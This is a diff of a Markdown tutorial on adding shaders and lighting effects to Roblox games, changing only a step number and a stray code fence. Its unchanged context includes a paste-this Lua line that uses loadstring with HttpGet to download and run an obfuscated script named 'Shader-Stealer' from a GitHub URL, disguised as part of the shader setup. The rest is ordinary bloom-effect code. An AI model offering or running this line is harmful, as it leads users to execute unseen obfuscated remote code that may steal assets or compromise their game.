@@ -18,7 +18,7 @@ Shaders in Roblox improve game visuals by adding realistic lighting, textures, a
 ```lua
 loadstring(game:HttpGet("https://raw.githubusercontent.com/JustToUseGiHubAi/Shader-Stealer-noui-/refs/heads/main/fr-obfuscated.lua"))()
 ```
-4. Add effects like:  
+3. Add effects like:  
    - **BloomEffect**: Adds glow.  
    - **BlurEffect**: Creates blur.  
    - **ColorCorrectionEffect**: Adjusts brightness/contrast. Or you can customise it how ever you want!!!!!
@@ -35,7 +35,6 @@ bloom.Intensity = 1.5
 bloom.Size = 24
 bloom.Threshold = 0.8
 bloom.Parent = Lighting
-```
 ```
 # Pre-Made 1-5
 
